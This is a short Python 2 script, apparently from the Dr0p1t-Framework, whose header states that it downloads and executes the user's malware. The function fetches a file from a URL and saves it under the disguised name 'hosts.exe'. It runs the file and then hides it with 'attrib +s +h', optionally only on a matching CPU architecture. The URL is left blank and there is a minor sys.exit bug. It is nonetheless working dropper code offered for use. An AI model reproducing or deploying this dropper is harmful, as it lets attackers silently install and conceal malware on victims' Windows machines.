#Written by: Karim shoair - D4Vinci ( Dr0p1t-Framework )
#This script aims to download and execute your malware (¯\_(ツ)_/¯)
#Start
from os import popen
from sys import exit
from platform import architecture
from urllib import urlretrieve

def fire_things_up(url,arch="No"):
    url   = ""
    #check architecture
    if arch != "No":
        if architecture()[0][:2] == arch:
            x = urlretrieve(url,"hosts.exe")
            xx = popen("hosts.exe")
            xxx = popen("attrib +s +h hosts.exe")
            sys.exit(0)
    else:
        x = urlretrieve(url,"hosts.exe")
        xx = popen("hosts.exe")
        xxx = popen("attrib +s +h hosts.exe") #hiding the file
        sys.exit(0)
